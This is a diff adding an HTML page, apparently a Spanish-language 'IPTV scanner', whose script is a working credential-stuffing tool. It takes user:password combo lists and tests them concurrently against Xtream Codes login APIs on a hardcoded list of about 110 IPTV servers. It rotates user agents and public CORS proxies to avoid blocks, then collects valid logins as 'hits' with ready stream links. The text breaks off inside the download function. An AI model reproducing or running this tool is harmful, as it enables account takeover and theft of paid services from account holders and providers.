@@ -1,0 +1,1153 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes">
+    <title>LEGION · FR.PE</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            padding: 1.2rem;
+            font-family: 'Share Tech Mono', 'Courier New', monospace;
+            color: #e6f7f0;
+            position: relative;
+            background: #0b0e12;
+            overflow-x: hidden;
+        }
+
+        
+        #matrixCanvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            pointer-events: none;
+            opacity: 0.6;
+        }
+
+        body::after {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(6, 10, 14, 0.55);
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        .app {
+            max-width: 1300px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 2;
+        }
+
+        .hero-brand {
+            text-align: center;
+            margin-bottom: 1.8rem;
+            padding: 0.6rem 0;
+            position: relative;
+        }
+
+        .hero-brand h1 {
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 900;
+            font-size: 5.5rem;
+            letter-spacing: 0.12em;
+            background: linear-gradient(135deg, #66ffcc, #33ff99, #66ffcc);
+            background-size: 200% 200%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            filter: drop-shadow(0 0 50px rgba(0, 255, 180, 0.15));
+            animation: breatheGlow 3s ease-in-out infinite alternate;
+            line-height: 1.1;
+        }
+
+        .hero-brand .sub {
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 700;
+            font-size: 1.1rem;
+            letter-spacing: 0.25em;
+            color: rgba(102, 255, 204, 0.4);
+            margin-top: -0.2rem;
+            text-transform: uppercase;
+        }
+
+        @keyframes breatheGlow {
+            0% { filter: drop-shadow(0 0 30px rgba(0, 255, 180, 0.10)); }
+            100% { filter: drop-shadow(0 0 80px rgba(0, 255, 200, 0.30)); }
+        }
+
+        .glass {
+            background: rgba(8, 14, 18, 0.55);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border-radius: 2.2rem;
+            border: 1px solid rgba(102, 255, 204, 0.08);
+            box-shadow: 0 8px 50px rgba(0, 0, 0, 0.35);
+            padding: 1.2rem 1.6rem;
+            margin-bottom: 1.2rem;
+            transition: border-color 0.25s ease;
+        }
+
+        .glass:hover {
+            border-color: rgba(102, 255, 204, 0.15);
+        }
+
+        .dashboard {
+            display: grid;
+            grid-template-columns: 1fr 340px;
+            gap: 1.2rem;
+        }
+
+        .main-col {
+            display: flex;
+            flex-direction: column;
+            gap: 1.2rem;
+        }
+
+        .side-col {
+            display: flex;
+            flex-direction: column;
+            gap: 1.2rem;
+        }
+
+        .form-row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.7rem;
+            align-items: flex-end;
+        }
+
+        .form-group {
+            flex: 1;
+            min-width: 130px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 0.6rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            color: rgba(102, 255, 204, 0.5);
+            margin-bottom: 0.2rem;
+        }
+
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(102, 255, 204, 0.08);
+            border-radius: 1.2rem;
+            padding: 0.5rem 1rem;
+            color: #d4f0e8;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 0.8rem;
+            outline: none;
+            transition: 0.2s;
+            -webkit-appearance: none;
+            appearance: none;
+        }
+
+        .form-group select {
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%2366ffcc' d='M6 8L1 3h10z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 1rem center;
+            background-size: 0.8rem;
+            padding-right: 2.5rem;
+        }
+
+        .form-group input:focus,
+        .form-group select:focus {
+            border-color: rgba(102, 255, 204, 0.25);
+            box-shadow: 0 0 30px rgba(0, 255, 180, 0.03);
+        }
+
+        .btn {
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 700;
+            font-size: 0.65rem;
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+            padding: 0.5rem 1.6rem;
+            border-radius: 3rem;
+            border: none;
+            cursor: pointer;
+            transition: 0.2s;
+            background: rgba(102, 255, 204, 0.05);
+            color: #66ffcc;
+            border: 1px solid rgba(102, 255, 204, 0.08);
+            box-shadow: 0 2px 16px rgba(0, 0, 0, 0.2);
+        }
+
+        .btn:hover {
+            background: rgba(102, 255, 204, 0.08);
+            border-color: rgba(102, 255, 204, 0.20);
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #0e8a7a, #0a6b5e);
+            color: #fff;
+            border-color: transparent;
+            box-shadow: 0 4px 24px rgba(0, 255, 180, 0.05);
+        }
+
+        .btn-primary:hover {
+            background: linear-gradient(135deg, #12a08c, #0d7d6b);
+            box-shadow: 0 4px 32px rgba(0, 255, 180, 0.10);
+            transform: translateY(-1px);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.25;
+            transform: none;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        .btn-danger {
+            background: rgba(200, 60, 60, 0.08);
+            color: #e07a7a;
+            border-color: rgba(200, 60, 60, 0.10);
+        }
+
+        .btn-danger:hover {
+            background: rgba(200, 60, 60, 0.14);
+        }
+
+        .btn-outline {
+            background: transparent;
+            border-color: rgba(102, 255, 204, 0.05);
+            color: #7aa9a8;
+        }
+
+        .btn-outline:hover {
+            background: rgba(102, 255, 204, 0.03);
+            border-color: rgba(102, 255, 204, 0.12);
+        }
+
+        .btn-sm {
+            font-size: 0.55rem;
+            padding: 0.3rem 1.2rem;
+        }
+
+        .btn-xs {
+            font-size: 0.5rem;
+            padding: 0.2rem 0.9rem;
+        }
+
+        .chip {
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+            background: rgba(0, 0, 0, 0.15);
+            padding: 0.2rem 1rem;
+            border-radius: 60px;
+            border: 1px solid rgba(102, 255, 204, 0.04);
+            font-size: 0.6rem;
+            font-weight: 600;
+            color: #7aa9a8;
+        }
+
+        .chip input[type="checkbox"] {
+            accent-color: #33ff99;
+            width: 14px;
+            height: 14px;
+            cursor: pointer;
+        }
+
+        .chip label {
+            cursor: pointer;
+        }
+
+       
+        .chip.hidden-chip {
+            display: none !important;
+        }
+
+        .progress-compact .meta {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.65rem;
+            color: rgba(102, 255, 204, 0.4);
+        }
+
+        .progress-compact .meta .highlight {
+            color: #66ffcc;
+            font-weight: 600;
+        }
+
+        .track {
+            background: rgba(255, 255, 255, 0.02);
+            height: 6px;
+            border-radius: 40px;
+            overflow: hidden;
+            border: 1px solid rgba(102, 255, 204, 0.03);
+            margin: 0.2rem 0;
+        }
+
+        .track .fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #33ff99, #66ffcc);
+            border-radius: 40px;
+            transition: width 0.3s ease;
+        }
+
+        .current-combo {
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 0.65rem;
+            color: rgba(102, 255, 204, 0.4);
+            padding: 0.2rem 0.6rem;
+            background: rgba(0, 0, 0, 0.10);
+            border-radius: 40px;
+            border: 1px solid rgba(102, 255, 204, 0.02);
+            word-break: break-all;
+        }
+
+        .hits-scroll {
+            max-height: 360px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+            padding-right: 0.2rem;
+        }
+
+        .hits-scroll::-webkit-scrollbar {
+            width: 4px;
+        }
+        .hits-scroll::-webkit-scrollbar-track {
+            background: rgba(0, 0, 0, 0.10);
+            border-radius: 20px;
+        }
+        .hits-scroll::-webkit-scrollbar-thumb {
+            background: #33ff99;
+            border-radius: 20px;
+        }
+
+        .hit-entry {
+            background: rgba(0, 0, 0, 0.20);
+            border-radius: 1.2rem;
+            padding: 0.6rem 1rem;
+            border-left: 3px solid rgba(102, 255, 204, 0.08);
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 0.6rem;
+            line-height: 1.6;
+            white-space: pre-wrap;
+            word-break: break-word;
+            color: #c8e6dd;
+            transition: 0.15s;
+        }
+
+        .hit-entry:hover {
+            background: rgba(0, 0, 0, 0.28);
+            border-left-color: rgba(102, 255, 204, 0.20);
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 0.8rem 1.8rem;
+            margin-top: 0.5rem;
+            padding-top: 0.8rem;
+            border-top: 1px solid rgba(102, 255, 204, 0.03);
+        }
+
+        .footer-links .copy {
+            font-size: 0.55rem;
+            color: rgba(102, 255, 204, 0.15);
+            letter-spacing: 0.1em;
+        }
+
+        @media (max-width: 1020px) {
+            .dashboard {
+                grid-template-columns: 1fr;
+            }
+            .side-col {
+                display: grid;
+                grid-template-columns: 1fr 1fr;
+                gap: 1.2rem;
+            }
+        }
+
+        @media (max-width: 680px) {
+            body {
+                padding: 0.6rem;
+            }
+            .hero-brand h1 {
+                font-size: 2.8rem;
+            }
+            .side-col {
+                grid-template-columns: 1fr;
+            }
+            .glass {
+                padding: 0.8rem 1rem;
+            }
+            .form-row {
+                flex-direction: column;
+            }
+            .form-group {
+                min-width: 100%;
+            }
+        }
+
+        .flex { display: flex; }
+        .flex-wrap { flex-wrap: wrap; }
+        .gap-1 { gap: 0.5rem; }
+        .gap-2 { gap: 0.8rem; }
+        .items-center { align-items: center; }
+        .justify-between { justify-content: space-between; }
+        .mt-1 { margin-top: 0.5rem; }
+        .mb-1 { margin-bottom: 0.5rem; }
+        .w-full { width: 100%; }
+        .text-muted { color: rgba(102, 255, 204, 0.25); }
+        .text-sm { font-size: 0.7rem; }
+        .text-xs { font-size: 0.6rem; }
+        .font-mono { font-family: 'Share Tech Mono', monospace; }
+    </style>
+</head>
+<body>
+
+    
+    <canvas id="matrixCanvas"></canvas>
+
+    <div class="app">
+
+        <div class="hero-brand">
+            <h1>LEGION FR.PE</h1>
+            <div class="sub">SCANNER IPTV</div>
+        </div>
+
+        <div class="dashboard">
+
+            <div class="main-col">
+
+                <div class="glass">
+                    <div class="form-row">
+                        <div class="form-group" style="flex:2;">
+                            <label>🌐 Añade Tu Servidor</label>
+                            <input type="text" id="hostInput" placeholder="ej: tv.servidor.com:8080" />
+                        </div>
+                        <div class="form-group" style="flex:1;">
+                            <label>⚡ Hilos</label>
+                            <input type="number" id="concurrencyInput" min="1" max="500" value="120" />
+                        </div>
+                    </div>
+
+                    <div class="form-row" style="margin-top:0.4rem;">
+                        <div class="form-group" style="flex:1.5;">
+                            <label>🌐 Elige Servidor</label>
+                            <select id="presetServerSelect">
+                                <option value="">-- Selecciona servidor --</option>
+                            </select>
+                        </div>
+                        <div class="form-group" style="flex:1;">
+                            <label> Cargar combo</label>
+                            <button id="loadFileBtn" class="btn btn-sm btn-primary" style="width:100%;"> Carga Tu Combo Aqui</button>
+                            <input type="file" id="comboFile" accept=".txt" style="display:none;" />
+                        </div>
+                    </div>
+
+                    <div class="flex flex-wrap gap-2 items-center" style="margin-top:0.6rem;">
+                        
+                        <div class="chip hidden-chip">
+                            <input type="checkbox" id="useCors" checked />
+                            <label for="useCors">🌐 CORS</label>
+                        </div>
+                        <div class="chip hidden-chip">
+                            <input type="checkbox" id="autoDownload" checked />
+                            <label for="autoDownload">💾 AutoDL</label>
+                        </div>
+                        <button id="clearCombosBtn" class="btn btn-xs btn-outline">🧹 Limpiar combo</button>
+                        <button id="clearAllBtn" class="btn btn-xs btn-outline">🧹 Limpiar todo</button>
+                    </div>
+
+                    <div class="flex flex-wrap gap-2 items-center" style="margin-top:0.8rem; padding-top:0.6rem; border-top:1px solid rgba(102,255,204,0.04);">
+                        <button id="startBtn" class="btn btn-primary">▶ Iniciar</button>
+                        <button id="stopBtn" class="btn btn-danger">⏹ Detener</button>
+                        <button id="saveBtn" class="btn btn-outline">Guardar Hits Sacados</button>
+                    </div>
+                </div>
+
+                <div class="glass">
+                    <div class="flex justify-between items-center">
+                        <span class="text-sm" style="color:rgba(102,255,204,0.35);">RESUMEN:</span>
+                        <span id="hitsCount" style="font-weight:700; color:#66ffcc;">🎉 HITS: 0</span>
+                    </div>
+                    <div class="progress-compact" style="margin-top:0.3rem;">
+                        <div class="meta">
+                            <span id="progressText">Esperando...</span>
+                            <span class="highlight" id="progressPct">0%</span>
+                        </div>
+                        <div class="track">
+                            <div id="progressBarFill" class="fill"></div>
+                        </div>
+                        <div id="currentCombo" class="current-combo">👤 Usuario: -</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="side-col">
+
+                <div class="glass" style="flex:1; display:flex; flex-direction:column;">
+                    <div class="flex justify-between items-center" style="margin-bottom:0.5rem;">
+                        <span class="text-sm" style="color:rgba(102,255,204,0.35);">🎉 HITS</span>
+                        <span id="hitsCountSide" style="font-weight:700; color:#66ffcc;">0</span>
+                    </div>
+                    <div id="hitsContainer" class="hits-scroll" style="flex:1;"></div>
+                </div>
+
+                <div class="glass">
+                    <div class="footer-links" style="margin-top:0;">
+                        <span class="copy">Desarrollado Por Percy</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        
+        (function() {
+            const canvas = document.getElementById('matrixCanvas');
+            const ctx = canvas.getContext('2d');
+
+            let width, height;
+            let columns;
+            const fontSize = 16;
+            let drops = [];
+            const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz$#@%&*()!?';
+            const charArray = chars.split('');
+
+            function resizeCanvas() {
+                width = canvas.width = window.innerWidth;
+                height = canvas.height = window.innerHeight;
+                columns = Math.floor(width / fontSize);
+                drops = [];
+                for (let i = 0; i < columns; i++) {
+                    drops[i] = Math.floor(Math.random() * -100);
+                }
+            }
+
+            function drawMatrix() {
+                ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
+                ctx.fillRect(0, 0, width, height);
+
+                ctx.fillStyle = '#33ff99';
+                ctx.font = fontSize + 'px monospace';
+
+                for (let i = 0; i < drops.length; i++) {
+                    const char = charArray[Math.floor(Math.random() * charArray.length)];
+                    const x = i * fontSize;
+                    const y = drops[i] * fontSize;
+
+                    
+                    const brightness = Math.random() * 0.5 + 0.3;
+                    ctx.fillStyle = `rgba(51, 255, 153, ${brightness})`;
+                    ctx.fillText(char, x, y);
+
+                    if (y > height && Math.random() > 0.98) {
+                        drops[i] = 0;
+                    }
+                    drops[i]++;
+                }
+            }
+
+            function animate() {
+                drawMatrix();
+                requestAnimationFrame(animate);
+            }
+
+            window.addEventListener('resize', resizeCanvas);
+            resizeCanvas();
+            animate();
+
+            
+            document.addEventListener('visibilitychange', () => {
+                
+            });
+        })();
+
+        
+        const RAW_SERVERS = [
+            "http://daleplaytv.vip:80", "http://tv.zapping.life:8080", "http://Streamprime.vip:80",
+            "http://tv.proyectox.vip:8080", "http://xc.adultiptv.net:80", "http://cinemagold.club:80",
+            "http://goldtv.lat:80", "http://tv.nuevadomi.com:8080", "http://p2premium.club:80",
+            "http://streamprime.vip:8880", "http://tv.zeuspro.xyz:2052", "http://redworld.pro:8880",
+            "http://venuschiletv.lat:8880", "http://canal-pro.xyz:8080", "http://somoseluno.blog:80",
+            "http://duolatin.top:80", "http://cinetvgo.com:80", "http://campstvpro.com:80",
+            "http://daleplay.vip:80", "http://liontv.es:80", "http://sdmx.vip:80",
+            "http://livetv-plus.com:80", "http://zafertv85.shop:8080", "http://ip74.ddns.net:8081",
+            "https://dnslivetv.online:443", "http://tv-privado.live:8080", "http://infinitistreamapp.com:8080",
+            "http://norrothcc.top:8080", "http://team.plus-stream.com:8080", "http://totalplay.site:8080",
+            "http://tvum.vip:80", "http://mtv.bo:80", "http://osvaldo.ddnsgeek.com:2082",
+            "http://gama-mx.com:8085", "http://ultrontv.xyz:80", "http://accountv3289.smartgw.st:80",
+            "http://domestipo1.online:80", "http://tv.zeuspro.xyz:2052", "http://pacodigital10.chocoplus.xyz:8080",
+            "http://Supersonictv.live:8080", "http://multinettv.pro:80", "http://deluxe-tv.xyz:80",
+            "http://gxmax.biz:80", "http://api.nerdtv.xyz:80", "http://imaxplay.net:2082",
+            "http://fastream.xyz:8080", "http://sinlimitestv.com:80", "http://playpromax.xyz:80",
+            "http://newultra.xyz:8080", "http://pixelmax.link:8080", "http://7rota2apps.top:8080",
+            "http://vipbhbiss.top:8080", "http://tvgusplay.online:80", "http://fivetv.org:25461",
+            "http://ultrax.online:8080", "http://zona593ec.online:8080", "http://streamingtv.vip:80",
+            "http://6digital9.chocoplus.xyz:8080", "http://ecuazona.live:80", "http://live.detodotvplay.com:8080",
+            "http://micaplay.net:80", "http://portal.iptvprivado.net:8080", "http://smarterstv99.dynds.tv:25461",
+            "http://playtvpremium.xyz:8080", "http://5.mdtv.me:80", "http://s1.exabytetv.info:8080",
+            "http://gt.lomejortv.xyz:8080", "http://portal.exabytetv.info:8080", "http://vipgpno.top:8080",
+            "http://live.fuxxion.club:8080", "http://latamplus.site:80", "http://allinonestream.fans:8080",
+            "http://d.plmv.site:80", "http://fultv.me:80", "http://masterclic.org:8080",
+            "http://jmrk.xyz:8080", "http://codetv.ovh:80", "http://legiontv.online:8080",
+            "http://ultrapremium.cloud:8080", "http://nxt.plus:8080", "http://tvlatino.club:2082",
+            "http://ultra-premiun-pro.xyz:8080", "http://peruplux.site:8080", "http://veotv.site:80",
+            "http://justplay.best:8080", "http://tvhomesmart.xyz:8080", "http://play.steeltv.org:8080",
+            "http://amepz.xyz:2052", "http://p2premiun.club:8080", "http://xtream.lat:8080",
+            "http://bccdn.xyz:80", "http://vipshoot.top:8080", "http://premierchile.shop:8080",
+            "http://tvpremiun.pro:8080", "http://b1g.ooo:80", "http://ratax.in:8880",
+            "https://zona593ec.online", "http://housery.top:8080", "http://playcenter.app",
+            "http://1111.wf:80", "http://atmosbr.online", "http://loadbl2.online:80",
+            "http://bdta.pro", "http://uniplay.link", "http://testerosh.top:80",
+            "http://splaytv.club", "http://xciptv.8888play.one", "http://xciptv.aplicativos.top:80",
+            "http://xcloudsrv.us:2082", "http://zeusplay.life:80"
+        ];
+        const UNIQUE_SERVERS = [...new Map(RAW_SERVERS.map(s => [s.trim(), s.trim()])).values()];
+
+      
+        const hostInput = document.getElementById('hostInput');
+        const concurrencyInput = document.getElementById('concurrencyInput');
+        const startBtn = document.getElementById('startBtn');
+        const stopBtn = document.getElementById('stopBtn');
+        const saveBtn = document.getElementById('saveBtn');
+        const useCorsCheck = document.getElementById('useCors');
+        const autoDownload = document.getElementById('autoDownload');
+        const hitsCount = document.getElementById('hitsCount');
+        const hitsCountSide = document.getElementById('hitsCountSide');
+        const progressFill = document.getElementById('progressBarFill');
+        const progressPct = document.getElementById('progressPct');
+        const progressTextSpan = document.getElementById('progressText');
+        const currentComboSpan = document.getElementById('currentCombo');
+        const comboFile = document.getElementById('comboFile');
+        const presetSelect = document.getElementById('presetServerSelect');
+        const clearAllBtn = document.getElementById('clearAllBtn');
+        const clearCombosBtn = document.getElementById('clearCombosBtn');
+        const hitsContainer = document.getElementById('hitsContainer');
+        const loadFileBtn = document.getElementById('loadFileBtn');
+
+       
+        let isRunning = false,
+            stopRequested = false;
+        let serverIP = null,
+            serverGeo = null;
+        let combosActuales = [];
+        let hits = [];
+        let jobProxy = null;
+
+        const proxyFailMap = new Map();
+        const PROXY_MAX_FAILS = 3,
+            COOLDOWN = 60000;
+        const CORS_PROXIES = [
+            'https://cors.isomorphic-git.org/{url}',
+            'https://thingproxy.freeboard.io/fetch/{url}',
+            'https://api.allorigins.win/raw?url={url}',
+            'https://corsproxy.io/?{url}',
+            'https://api.codetabs.com/v1/proxy/?quest={url}',
+            'https://yacdn.org/proxy/{url}',
+            'https://api.s0n1c.org/cors?url={url}'
+        ];
+
+       
+        function randomUA() {
+            const ua = [
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/129.0.0.0 Safari/537.36",
+                "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 Chrome/129.0.0.0 Mobile Safari/537.36",
+                "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0"
+            ];
+            return ua[Math.floor(Math.random() * ua.length)];
+        }
+
+        function createSession() {
+            return { headers: { "User-Agent": randomUA(), "Accept": "application/json, text/javascript,*/*;q=0.9" }, cookies: {} };
+        }
+
+        function attachCookies(opts, session) {
+            const cstr = Object.entries(session.cookies || {}).map(([k, v]) => `${k}=${v}`).join("; ");
+            if (cstr) { opts.headers = { ...(opts.headers || {}) };
+                opts.headers.Cookie = cstr; }
+            return opts;
+        }
+
+        function fetchTimeout(url, opts = {}, ms = 4000) {
+            return new Promise((resolve, reject) => {
+                const ctrl = new AbortController();
+                const id = setTimeout(() => { ctrl.abort();
+                    reject(new Error('timeout')); }, ms);
+                fetch(url, { ...opts, signal: ctrl.signal })
+                    .then(r => { clearTimeout(id);
+                        resolve(r); })
+                    .catch(e => { clearTimeout(id);
+                        reject(e); });
+            });
+        }
+
+        function proxyIsCold(tpl) {
+            const s = proxyFailMap.get(tpl);
+            return s && s.until && Date.now() < s.until;
+        }
+
+        function noteProxyFail(tpl) {
+            let s = proxyFailMap.get(tpl) || { n: 0, until: 0 };
+            s.n++;
+            if (s.n >= PROXY_MAX_FAILS) { s.until = Date.now() + COOLDOWN;
+                s.n = 0; }
+            proxyFailMap.set(tpl, s);
+        }
+
+        function noteProxyOk(tpl) { proxyFailMap.delete(tpl); }
+
+        async function fetchWithCors(url, options = {}) {
+            const baseOpts = { cache: 'no-store', keepalive: false, ...options };
+            if (jobProxy && !proxyIsCold(jobProxy)) {
+                try {
+                    const proxied = jobProxy.replace('{url}', encodeURIComponent(url));
+                    const r = await fetchTimeout(proxied, baseOpts);
+                    if (r.ok) { noteProxyOk(jobProxy); return r; }
+                    noteProxyFail(jobProxy);
+                } catch (e) { noteProxyFail(jobProxy); }
+            }
+            try {
+                const r = await fetchTimeout(url, baseOpts);
+                if (r.ok) return r;
+            } catch (e) {}
+            if (!useCorsCheck.checked) throw new Error('No cors');
+            const pool = CORS_PROXIES.filter(t => t !== jobProxy && !proxyIsCold(t)).sort(() => Math.random() - 0.5);
+            for (const tpl of pool) {
+                try {
+                    const proxied = tpl.replace('{url}', encodeURIComponent(url));
+                    const r = await fetchTimeout(proxied, baseOpts);
+                    if (r.ok) { noteProxyOk(tpl);
+                        jobProxy = tpl; return r; }
+                    noteProxyFail(tpl);
+                } catch (e) { noteProxyFail(tpl); }
+            }
+            throw new Error('Fetch failed');
+        }
+
+        function extractCombo(line) {
+            if (!line) return null;
+            let s = String(line).normalize('NFKC').replace(/\s+/g, ' ').trim();
+            const m = s.match(/([^:\s][^:\n\r]*)\s*:\s*([^:\s][^\n\r]*)/u);
+            if (!m) return null;
+            const user = m[1].trim(),
+                pass = m[2].trim();
+            if (!user || !pass) return null;
+            return [user, pass];
+        }
+
+        async function getTotalCounts(host, user, pass, usedProto) {
+            const baseUrl =
+                `${usedProto}${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
+            const opts = { headers: { 'User-Agent': randomUA() } };
+            try {
+                const [liveResp, vodResp, seriesResp] = await Promise.allSettled([
+                    fetchTimeout(`${baseUrl}&action=get_live_streams`, opts, 4000),
+                    fetchTimeout(`${baseUrl}&action=get_vod_streams`, opts, 4000),
+                    fetchTimeout(`${baseUrl}&action=get_series`, opts, 4000)
+                ]);
+                let channels = 0,
+                    movies = 0,
+                    series = 0;
+                if (liveResp.status === 'fulfilled' && liveResp.value.ok) {
+                    const data = await liveResp.value.json();
+                    if (Array.isArray(data)) channels = data.length;
+                }
+                if (vodResp.status === 'fulfilled' && vodResp.value.ok) {
+                    const data = await vodResp.value.json();
+                    if (Array.isArray(data)) movies = data.length;
+                }
+                if (seriesResp.status === 'fulfilled' && seriesResp.value.ok) {
+                    const data = await seriesResp.value.json();
+                    if (Array.isArray(data)) series = data.length;
+                }
+                return { channels, movies, series };
+            } catch (e) {
+                return { channels: 0, movies: 0, series: 0 };
+            }
+        }
+
+        async function validarCombo(host, combo, opts = {}, session = null, ui = null, nick = 'by:PERCY FR.PE') {
+            if (stopRequested) return null;
+            const pair = Array.isArray(combo) ? combo : extractCombo(combo);
+            if (!pair) return null;
+            const [user, pass] = pair;
+            if (ui) ui.user.textContent = `👤 Usuario : ${user}:${pass}`;
+            const protos = ['http://', 'https://'];
+            let data = null,
+                usedProto = 'http://';
+            for (const p of protos) {
+                const url =
+                `${p}${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
+                try {
+                    const res = await fetchWithCors(url, opts);
+                    if (res.ok) {
+                        data = await res.json();
+                        usedProto = p;
+                        break;
+                    }
+                } catch (e) {}
+            }
+            if (!data) return null;
+            const uinfo = data.user_info || {};
+            const ok = (uinfo.status === 'Active' || uinfo.status === 'Activo' || String(uinfo.auth) === '1' || uinfo
+                .status === 'Actif');
+            if (!ok) return null;
+
+            const counts = await getTotalCounts(host, user, pass, usedProto);
+            const [hostname, port] = host.includes(':') ? [host.split(':')[0], host.split(':')[1]] : [host, (usedProto ===
+                    'https://' ? '443' : '80')];
+            const linkM3u =
+                `${usedProto}${host}/get.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&type=m3u_plus`;
+            const geo = serverGeo || null;
+            const pais = geo ? `${geo.country}` : 'Desconocido';
+            return {
+                user,
+                pass,
+                host,
+                hostname,
+                port,
+                usedProto,
+                uinfo,
+                linkM3u,
+                geo,
+                pais,
+                nick: nick || 'by:PERCY FR.PE',
+                channels: counts.channels,
+                movies: counts.movies,
+                series: counts.series,
+                total: counts.channels + counts.movies + counts.series
+            };
+        }
+
+        function buildHitHTML(hitData) {
+    const { user, pass, host, usedProto, uinfo, linkM3u, geo, pais, nick, channels, movies, series, total } = hitData;
+    const created = uinfo.created_at ? new Date(uinfo.created_at * 1000).toLocaleDateString() : 'N/D';
+    const expires = uinfo.exp_date ? new Date(uinfo.exp_date * 1000).toLocaleDateString() : 'N/D';
+    const status = (uinfo.status === 'Active' || uinfo.status === 'Activo' || String(uinfo.auth) === '1') ? '✅ Active' : '❌ Inactive';
+    const maxConns = uinfo.max_connections ?? uinfo.max_cons ?? 'N/D';
+    const activeCons = uinfo.active_cons ?? uinfo.connected_cons ?? 'N/D';
+    const ip = geo ? geo.ip : 'N/D';
+    const paisEmoji = geo ? '📌' : '';
+
+    return `
+
+
+  𝐅𝐑.𝐏𝐄 𝐇𝐈𝐓            
+
+║ 🧑‍🦱 Usuario: ${user}
+║ 🔑 Contraseña: ${pass} 
+║ 📡 Servidor: ${usedProto}${host}
+║ ⏳ Creada El: ${created}                                     
+║ ⌛ Expira El: ${expires}                                            
+║ 📡 IP: ${ip}                                                                                                                                                                                                
+║ 👥 Conexiones máximas: ${maxConns} │ Activas: ${activeCons}  
+║ 🔗 Link M3U: ${linkM3u}                                                                                                   
+║ 📜 Estado: ${status}                                                                                
+║ 📌 País : ${paisEmoji} ${pais}                              
+║ 👥 Comunidad:https://chat.whatsapp.com/FyyZzU5cU9x8Ndd5kT2rfF                                  
+`;
+}
+
+        function mostrarHit(hitData) {
+            const content = buildHitHTML(hitData);
+            const div = document.createElement('div');
+            div.className = 'hit-entry';
+            div.textContent = content;
+            hitsContainer.prepend(div);
+            hits.push({ text: content, ...hitData });
+            const count = hits.length;
+            hitsCount.innerHTML = `📜 HITS: ${count}`;
+            hitsCountSide.textContent = count;
+        }
+
+        function actualizarProgreso(escaneados, total) {
+            const pct = total === 0 ? 0 : (escaneados / total) * 100;
+            progressFill.style.width = pct + '%';
+            progressPct.textContent = Math.round(pct) + '%';
+            progressTextSpan.textContent = ` escaneados: ${escaneados} de ${total} | 📜 HITS: ${hits.length}`;
+            const count = hits.length;
+            hitsCount.innerHTML = `📜 HITS: ${count}`;
+            hitsCountSide.textContent = count;
+        }
+
+        async function processarJob(host, combosArr, concurrency, nick) {
+            if (!combosArr.length) return;
+            const total = combosArr.length;
+            let processed = 0;
+            const sleep = ms => new Promise(r => setTimeout(r, ms));
+            let index = 0;
+            const worker = async () => {
+                const session = createSession();
+                while (index < total && !stopRequested) {
+                    const i = index++;
+                    if (i >= total) break;
+                    const combo = combosArr[i];
+                    if (!combo) continue;
+                    currentComboSpan.textContent = `👤 Usuario: ${combo}`;
+                    let opts = { headers: { ...session.headers } };
+                    opts = attachCookies(opts, session);
+                    try {
+                        const hitData = await validarCombo(host, combo, opts, session, { user: currentComboSpan },
+                            nick);
+                        if (!stopRequested && hitData) mostrarHit(hitData);
+                    } catch (e) {}
+                    processed++;
+                    actualizarProgreso(processed, total);
+                    await sleep(5 + Math.random() * 20);
+                    if (stopRequested) break;
+                }
+            };
+            progressTextSpan.textContent = '🚨 Iniciando escaneo ,suerte...';
+            const workers = Math.min(concurrency, total, 300);
+            await Promise.all(Array.from({ length: workers }, () => worker()));
+            currentComboSpan.textContent = '👤 Usuario: -';
+            progressTextSpan.textContent += stopRequested ? ' | ⏹ Detenido.' : ' | 🎉 Fin.';
+        }
+
+       
+        function downloadHits() {
+            if (hits.length === 0) {
+                alert('⚠️ No hay hits para descargar.');
+                return;
+            }
+
+            try {
+                const unique = new Map();
+                for (const h of hits) {
+                    if (!unique.has(h.text)) unique.set(h.text, h);
+                }
+
